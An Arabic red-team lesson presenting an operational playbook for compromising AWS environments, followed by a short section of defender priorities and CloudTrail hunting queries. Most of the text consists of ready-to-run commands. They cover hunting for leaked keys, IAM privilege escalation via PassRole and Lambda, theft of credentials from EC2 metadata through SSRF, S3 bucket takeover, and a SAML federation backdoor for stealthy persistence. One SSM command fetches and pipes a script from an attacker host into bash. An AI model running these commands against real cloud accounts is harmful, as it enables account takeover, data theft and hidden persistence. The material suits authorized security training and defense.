# سلاسل هجوم AWS العملية (Practical AWS Attack Chains)

تناول درس السحابة الأساسيات؛ أما هنا فنستعرض "دليل التشغيل" (Playbook) الذي تعتمده الفرق الحمراء (Red Teams) بمجرد الحصول على أي مستوى من الوصول إلى بيئة AWS. تبدأ هذه السلاسل من تسريب مفتاح وصول، وصولاً إلى الخدمات المتاحة، ثم البيانات، فالحوسبة، والانتقال عبر الحسابات (Cross-account)، حتى الوصول إلى السيطرة الكاملة على المنظمة.

> [!warning] للعمليات المصرح بها فقط
> تُفترض جميع الأوامر أدناه وجود تفويض رسمي للعمل على حساب AWS المستهدف. تذكر أن استدعاءات الـ API -حتى للقراءة فقط- تُسجل في CloudTrail وقد تُفسر كنشاط تخريبي.

## 1. الوصول الأولي (Initial Access) — مصادر تسريب المفاتيح

```terminal
# البحث في المصادر العامة عن مفاتيح AWS المسربة
github search "AKIA" filename:.env
github search 'org:target "AKIA"' --json
trufflehog git --repo https://github.com/target/website
gitleaks detect --source . -v

# اللقطات (Snapshots)، الصور، والحاويات (Buckets) العامة غالباً ما تحوي اعتمادات IAM
aws ec2 describe-snapshots --filters Name=is-public,Values=true --owner-ids <accountid>
aws s3 ls s3://target-public-bucket/
```

## 2. تحديد الهوية والصلاحيات (Identification & Enumeration)

```terminal
# التحقق من الهوية الحالية
aws sts get-caller-identity
# arn:aws:iam::123456789012:user/alice  → الحساب والمستخدم

# جرد السياسات الملحقة بالهوية الحالية (Principal)
aws iam list-attached-user-policies --user-name alice
aws iam list-user-policies --user-name alice
aws iam get-account-authorization-details > authdb.json   # في حال توفر صلاحية iam:Get*

# فحص ما يمكن للمستخدم/الدور فعله عبر الخدمات دون جرد يدوي مطول
pacu
> set_keys; import_keys default
> run iam__enum_permissions
> run iam__privesc_scan        # فحص أكثر من 30 مساراً موثقاً لتصعيد الصلاحيات
```

## 3. تصعيد الصلاحيات (Privilege Escalation) — المسارات الموثقة

| المسار (Path) | الأمر المختصر (One-liner) |
|------|-----------|
| `iam:CreateAccessKey` على مستخدم آخر | `aws iam create-access-key --user-name admin` |
| `iam:UpdateLoginProfile` | إعادة تعيين كلمة مرور وحدة التحكم (Console) لأي مستخدم |
| `iam:AttachUserPolicy` (للنفس أو الغير) | إلحاق سياسة `AdministratorAccess` |
| `iam:PutUserPolicy` | إضافة سياسة مضمنة (Inline) تمنح `*:*` |
| `iam:PassRole + ec2:RunInstances` | تشغيل مثيل EC2 ملحق به دور مسؤول (Admin Role) |
| `iam:PassRole + lambda:CreateFunction + lambda:Invoke` | تنفيذ كود برمجى بصلاحيات دور المسؤول |
| `iam:CreatePolicyVersion` + setDefault | استبدال نسخة سياسة مستخدمة من قبل دور عالي الصلاحيات |
| `sts:AssumeRole` (في حال كانت سياسة الثقة فضفاضة) | تقمص أي دور مفرط الصلاحيات |
| `cloudformation:UpdateStack` | استبدال نموذج الـ Stack والحصول على الصلاحيات التي ينشرها |

```terminal
# المسار التقليدي: PassRole + Lambda
aws iam create-role --role-name evil --assume-role-policy-document file://trust.json
aws iam attach-role-policy --role-name evil --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws lambda create-function --function-name pwn \
  --role arn:aws:iam::123:role/evil \
  --runtime python3.12 --handler index.handler \
  --zip-file fileb://pwn.zip
aws lambda invoke --function-name pwn /dev/stdout
```

## 4. بيانات التعريف في EC2 (Metadata) — استغلال ثغرات SSRF

```terminal
# الإصدار الأول (IMDSv1) - لا يزال منتشراً، خاصة في صور AMIs القديمة
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# الحصول على اعتمادات مؤقتة (Temporary Credentials) لدور الـ EC2

# الإصدار الثاني (IMDSv2) - يتطلب Token؛ قابل للاستغلال إذا سمحت ثغرة SSRF بإرسال طلب PUT
TOKEN=$(curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
curl -H "X-aws-ec2-metadata-token: $TOKEN" 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
```

> [!danger] نفس التقنية على ECS / EKS / Lambda
> العنوان `169.254.170.2` يعيد اعتمادات مهام ECS؛ وأي حاوية (Pod) غير مؤمنة تتيح الوصول لبيانات التعريف ستعيد اعتمادات الـ instance-profile. يجب دائماً فحص هذا المسار عند الحصول على تنفيذ كود عن بعد (RCE) داخل العنقود (Cluster).

## 5. هجمات S3 (S3 Attacks)

```terminal
# اكتشاف الحاويات (Buckets) غير المملوكة عبر شفافية الشهادات (CT) أو محركات البحث
nuclei -u target.com -t exposures/configs/aws-s3.yaml
aws s3 ls s3://target-backups/ --no-sign-request           # حاوية عامة
aws s3api get-bucket-policy --bucket target-prod
aws s3api get-bucket-acl --bucket target-prod

# الاستيلاء على الحاوية (Bucket Takeover) - تسجيل اسم حاوية محذوفة يشير إليها سجل CNAME
host static.target.com
# ← CNAME target-static.s3.amazonaws.com (يعيد NXDOMAIN) → قم بتسجيل هذا الاسم

# البحث عن البيانات الحساسة باستخدام grep على نطاق واسع
aws s3 sync s3://target-bucket/ . --quiet
grep -RE 'AKIA|aws_secret|password|BEGIN PRIVATE KEY' .
```

## 6. إساءة استخدام SSM Session Manager

```terminal
# في حال توفر صلاحية ssm:StartSession وكان الدور الملحق بالـ EC2 يملك SSMManagedInstanceCore
aws ssm describe-instance-information
aws ssm start-session --target i-0abc...
# ← جلسة تفاعلية، بدون مفاتيح SSH، وبدون منافذ مفتوحة، موثوقة بالكامل رغم تسجيلها

# التحرك الجانبي (Lateral Movement) باستخدام SendCommand
aws ssm send-command --instance-ids i-0abc... \
  --document-name AWS-RunShellScript \
  --parameters 'commands=["curl http://attacker/agent | bash"]'
```

## 7. اختراق الحسابات المتعددة (Cross-account Compromise)

```terminal
# البحث عن الحسابات الموثوقة في سياسات تقمص الأدوار
aws iam list-roles --query 'Roles[].[RoleName,AssumeRolePolicyDocument.Statement[].Principal]'

# منظمات AWS (Organizations) - إذا سيطرت على حساب الإدارة، يمكنك تقمص دور في أي حساب تابع
aws organizations list-accounts
aws sts assume-role --role-arn arn:aws:iam::CHILD:role/OrganizationAccountAccessRole \
  --role-session-name pivot

# مسح شامل لجميع الحسابات التي يمكن الوصول إليها
prowler aws --multi-account
ScoutSuite --provider aws
```

## 8. الأبواب الخلفية والاستمرارية (Backdoors & Persistence)

| الآلية | مدى التخفي (Stealth) |
|-----------|---------------|
| إنشاء مفتاح وصول جديد لمستخدم موجود | منخفض - إجراء إداري شائع |
| سياسة مضمنة تمنح `sts:AssumeRole *` لهوية جديدة | متوسط |
| Lambda + EventBridge لإعادة إنشاء دور محذوف كل ساعة | مرتفع جداً |
| مزود SAML تحت سيطرة المهاجم (IdP) | مرتفع جداً |
| تعديل سياسة مفتاح KMS لإضافة هوية المهاجم | متوسط |
| بيانات مستخدم EC2 (User-data) تُنفذ عند إعادة التشغيل | منخفض |

```terminal
# التخفي العالي: باب خلفي عبر اتحاد SAML
aws iam create-saml-provider --saml-metadata-document file://attacker_idp.xml --name Backup
aws iam create-role --role-name FedBackup --assume-role-policy-document '{
  "Statement":[{"Effect":"Allow","Action":"sts:AssumeRoleWithSAML",
    "Principal":{"Federated":"arn:aws:iam::123:saml-provider/Backup"},
    "Condition":{"StringEquals":{"SAML:aud":"https://signin.aws.amazon.com/saml"}}}]}'
aws iam attach-role-policy --role-name FedBackup --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
# الآن يمكنك تسجيل الدخول كأي هوية من مزود الهوية (IdP) الخاص بك، مع ظهور العملية كدخول SAML طبيعي.
```

![دورة حياة هجوم AWS](/images/lessons/aws_attack_lifecycle_en.png)


## 9. سيناريو اختراق كامل (End-to-end Engagement)

```
1. العثور على مفتاح (AKIA) في حاوية S3 عامة (ورث الكائن صلاحية القراءة العامة).
2. تنفيذ sts get-caller-identity ← تبين أنه مستخدم محدود الصلاحيات 'devops-bot'.
3. تنفيذ iam__privesc_scan ← المستخدم يملك صلاحية CreatePolicyVersion على سياسة ملحقة بـ AdminRole.
4. إنشاء نسخة سياسة جديدة بـ "Action":"*","Resource":"*".
5. تقمص دور المسؤول (AssumeRole AdminRole).
6. تنفيذ organizations list-accounts ← وجود 14 حساباً تابعاً.
7. تقمص دور OrganizationAccountAccessRole في كل حساب منها.
8. في كل حساب تابع: جمع سجلات CloudTrail، أسرار Secrets Manager، بيانات PII من S3، ولقطات RDS.
9. زرع باب خلفي عبر SAML في حساب الإدارة؛ وتنظيف أدلة التحرك الجانبي.
10. نتيجة التقرير: سيطرة كاملة على المنظمة من مفتاح مسرب واحد خلال 4 ساعات.
```

## أولويات الدفاع (Defender Priorities)

1. **منع المفاتيح طويلة الأمد**: فرض استخدام IAM Identity Center / SSO؛ وتدوير أي مفاتيح متبقية فور اكتشافها.
2. **حظر IMDSv1** على مستوى المنظمة عبر سياسات التحكم في الخدمة (SCPs)؛ وفرض IMDSv2 مع تحديد `hop-limit` بـ 1.
3. **تفعيل GuardDuty + CloudTrail + Config** في كل حساب وفي كل منطقة جغرافية.
4. **حدود الصلاحيات (Permission boundaries)** على أدوار المطورين لمنع مسارات تصعيد الصلاحيات.
5. **سياسات التحكم في الخدمة (SCPs)** على مستوى الوحدات التنظيمية (OU) لمنع إجراءات مثل `iam:*Policy*Version` أو إنشاء مفاتيح وصول لغير الذات.
6. **المراجعة اليومية لـ IAM Access Analyzer** لرصد أي وصول عابر للحسابات أو وصول خارجي.
7. **إغلاق مسار الاستيلاء على الحاويات**: عدم ترك سجلات CNAME تشير إلى مصادر S3 محذوفة.

## استعلامات التقصي النشط (Hunt Queries)

```sql
-- رصد محاولات تصعيد الصلاحيات (CloudTrail / Athena)
SELECT eventTime, userIdentity.arn, eventName, requestParameters
FROM cloudtrail_logs
WHERE eventName IN ('CreatePolicyVersion','SetDefaultPolicyVersion',
                    'AttachUserPolicy','AttachRolePolicy','PutUserPolicy',
                    'PutRolePolicy','UpdateAssumeRolePolicy','PassRole',
                    'CreateAccessKey','UpdateLoginProfile')
  AND userIdentity.type = 'IAMUser'
  AND eventTime > now() - interval '7' day;
```

```kql
// اكتشاف إنشاء مزود SAML جديد - حدث نادر وحساس (Sentinel)
AWSCloudTrail
| where EventName == "CreateSAMLProvider"
| project EventTime, UserIdentity, RequestParameters, SourceIPAddress
```
